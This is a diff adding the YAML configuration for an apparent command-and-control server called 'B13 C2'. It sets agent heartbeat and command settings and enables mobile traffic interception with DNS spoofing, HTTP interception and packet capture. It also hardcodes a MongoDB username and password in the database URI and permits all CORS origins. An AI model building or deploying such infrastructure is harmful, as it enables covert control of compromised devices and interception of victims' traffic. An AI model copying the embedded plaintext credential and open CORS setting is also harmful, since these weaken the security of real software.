@@ -1,0 +1,71 @@
+# B13 C2 Server Configuration
+
+# Server Settings
+server:
+  host: 0.0.0.0
+  port: 5001
+  debug: false
+
+# Security Settings
+security:
+  jwt_secret: ${JWT_SECRET}
+  encryption_key: ${ENCRYPTION_KEY}
+  password_salt_rounds: 12
+  jwt:
+    cookie_secure: true
+    csrf_protect: true
+    cookie_name: access_token
+    access_cookie_path: /
+    access_csrf_header_name: null
+    access_csrf_field_name: null
+    token_expires: 3600
+  cors:
+    allowed_origins: "*"  # Allow all origins for development
+    allowed_headers: ["Content-Type", "Authorization", "X-Requested-With"]
+    allowed_methods: ["GET", "POST", "PUT", "DELETE", "OPTIONS"]
+    max_age: 86400  # 24 hours
+  api_rate_limit:
+    calls_per_minute: 100
+    max_attempts: 3
+    backoff_factor: 1
+    max_delay: 30
+
+# Database Settings
+database:
+  uri: mongodb://paypeur:31101986@localhost:27017/paypeur
+  name: paypeur
+
+# Mobile Interception Settings
+mobile_interception:
+  enabled: true
+  interface: eth0
+  dns_spoofing: true
+  http_interception: true
+  packet_capture: true
+
+# Logging Settings
+logging:
+  level: INFO
+  file: c2_server.log
+  max_size: 100MB
+  backup_count: 5
+  format: '%(asctime)s - %(levelname)s - %(message)s'
+  datefmt: '%Y-%m-%d %H:%M:%S'
+
+# Agent Settings
+agent:
+  timeout: 300
+  heartbeat_interval: 30
+  max_retries: 3
+
+# Command Settings
+command:
+  max_length: 4096
+  timeout: 60
+  retry_delay: 5
+
+# Network Settings
+network:
+  max_connections: 100
+  buffer_size: 4096
+  listen_backlog: 128
